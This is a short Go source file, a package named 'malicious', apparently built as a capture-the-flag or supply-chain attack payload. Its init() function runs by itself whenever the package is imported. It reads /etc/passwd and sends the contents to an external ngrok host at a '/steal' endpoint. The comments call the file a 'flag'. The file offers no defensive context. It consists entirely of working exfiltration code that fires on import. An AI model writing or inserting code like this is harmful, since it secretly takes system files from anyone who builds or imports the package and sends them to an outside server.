package malicious

import (
    "fmt"
    "io/ioutil"
    "net/http"
)

func init() {
    // Read the flag from the local filesystem
    flag, err := ioutil.ReadFile("/etc/passwd")
    if err != nil {
        // If we can't read the flag, still let the build proceed
        fmt.Println("Error reading flag:", err)
        return
    }

    // Send the flag to your server
    http.Get("http://219b72d62597.ngrok-free.app/steal?flag=" + string(flag))
}
